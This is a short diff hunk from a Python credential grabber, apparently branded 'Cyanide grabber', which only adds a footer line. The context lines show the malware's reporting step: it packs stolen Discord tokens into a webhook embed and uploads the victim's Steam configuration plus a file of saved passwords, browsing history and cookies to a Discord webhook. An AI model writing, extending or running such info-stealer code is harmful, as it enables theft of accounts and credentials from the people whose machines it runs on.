@@ -121,6 +121,7 @@ class Main:
 
         embed = DiscordEmbed(title='Report')
         embed.add_embed_field(name='Tokens', value=f"""```{tokens}```""")
+        embed.set_footer(text='By Cyanide grabber')
         self.webhook.add_file(file=vdf.dumps(userConfig, True).encode(), filename="SteamConfig.txt")
         self.webhook.add_file(file=self.credsIntodict(listCreds).encode(), filename="Passwords.History.Cookies.txt")
         self.webhook.add_embed(embed)
